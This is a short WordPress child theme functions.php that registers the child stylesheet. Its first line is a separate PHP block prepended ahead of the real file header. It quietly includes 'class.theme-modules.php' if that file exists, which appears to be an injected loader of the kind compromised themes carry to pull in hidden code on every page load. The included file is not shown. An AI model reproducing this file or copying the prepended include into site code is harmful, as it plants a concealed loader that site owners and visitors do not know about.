<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
* The functions.php file of a child theme does not override its counterpart from the parent.
* Instead, it is loaded in addition to the parent’s functions.php
*
* @link https://codex.wordpress.org/Child_Themes
*
*/

// register and enqueue the stylesheet.
function register_child_theme_styles() {

	wp_enqueue_style( 'child-style',
		get_stylesheet_directory_uri() . '/style.css',
		wp_get_theme()->get('Version')
	);
}

add_action( 'wp_enqueue_scripts', 'register_child_theme_styles', 9999 );